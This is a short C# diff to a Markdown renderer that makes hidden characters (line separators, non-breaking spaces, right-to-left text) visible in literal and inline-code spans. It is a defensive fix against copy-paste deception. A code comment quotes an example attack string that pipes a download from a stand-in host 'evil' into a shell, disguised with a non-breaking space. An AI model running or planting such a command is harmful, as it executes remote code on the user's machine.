@@ -372,10 +372,11 @@ public static class MarkdownModel
             switch (inline)
             {
                 case LiteralInline lit:
-                    list.Add(new MdText(lit.Content.ToString(), style));
+                    list.Add(new MdText(HiddenText.RevealLineSeparators(lit.Content.ToString()), style));
                     break;
                 case CodeInline code:
-                    list.Add(new MdText(code.Content, style | MdStyle.Code));
+                    // As a code block: `true\u00A0#; curl evil | sh` drew as a comment and pasted as a command.
+                    list.Add(new MdText(HiddenText.Reveal(code.Content, rightToLeft: true), style | MdStyle.Code));
                     break;
                 case LineBreakInline br:
                     if (br.IsHard) { list.Add(new MdBreak()); } else { list.Add(new MdText(" ", style)); }
